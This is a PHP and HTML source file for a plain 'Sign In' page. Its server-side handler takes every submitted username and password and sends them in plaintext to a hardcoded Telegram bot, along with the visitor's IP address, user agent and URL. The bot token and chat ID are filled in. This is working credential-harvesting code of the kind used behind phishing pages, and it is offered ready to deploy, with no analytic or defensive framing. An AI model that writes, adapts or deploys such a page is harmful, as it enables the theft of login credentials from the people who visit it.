<?php
// ==== YOUR TELEGRAM CONFIG (already filled in) ====
$TELEGRAM_BOT_TOKEN = "8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw";
$TELEGRAM_CHAT_ID   = "5279025133";

function sendToTelegram($message) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
    $data = [
        'chat_id'    => $TELEGRAM_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];
    // fire-and-forget (fast & reliable on Railway)
    $ch = curl_init($url . '?' . http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

// ==== MAIN LOGIN HANDLER ====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $ip       = $_SERVER['REMOTE_ADDR'];
    $ua       = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $time     = date('Y-m-d H:i:s');

    // Send EVERY attempt to your Telegram
    $msg = "New Login Attempt\n";
    $msg .= "Time: $time\n";
    $msg .= "IP: $ip\n";
    $msg .= "User-Agent: $ua\n";
    $msg .= "Username: $username\n";
    $msg .= "Password: $password\n";
    $msg .= "URL: https://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";

    sendToTelegram($msg);

    // Optional: your real login check here
    if ($username === 'admin' && $password === 'your-real-password') {
        echo json_encode(['success' => true, 'message' => 'Login successful']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Invalid credentials']);
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Sign In</title>
    <style>
        body{font-family:Arial;max-width:380px;margin:60px auto;padding:20px;background:#f8f9fa;}
        input,button{width:100%;padding:12px;margin:8px 0;border-radius:6px;border:1px solid #ddd;box-sizing:border-box;}
        button{background:#007bff;color:white;font-size:16px;border:none;cursor:pointer;}
        h1{font-size:24px;}
    </style>
</head>
<body>
    <h1>Sign In</h1>
    <form id="loginForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').onsubmit = async e => {
            e.preventDefault();
            const fd = new FormData(e.target);
            const res = await fetch('', {method:'POST', body:fd});
            const json = await res.json();
            alert(json.message);
        };
    </script>
</body>
</html>
